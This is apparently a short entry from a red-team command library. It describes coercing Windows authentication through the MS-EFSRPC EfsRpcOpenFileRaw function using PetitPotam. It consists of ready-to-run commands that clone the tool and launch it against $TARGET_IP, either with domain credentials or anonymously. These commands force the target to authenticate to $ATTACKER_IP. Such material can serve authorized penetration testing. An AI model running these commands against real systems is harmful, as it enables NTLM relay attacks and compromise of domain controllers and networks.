---
id: d4cb01f3-5403-4032-b54c-ec2d3801f9ab
name: Coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam
type: command
executor: bash
data: 'git clone https://github.com/topotam/PetitPotam

  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP

  python3 petitpotam.py -d '''' -u '''' -p '''' $ATTACKER_IP $TARGET_IP'
output: null
created_at: '2023-04-06T03:56:05.989060+00:00'
updated_at: '2023-04-10T20:26:16.822815+00:00'
---

# Coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam

```bash
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
```


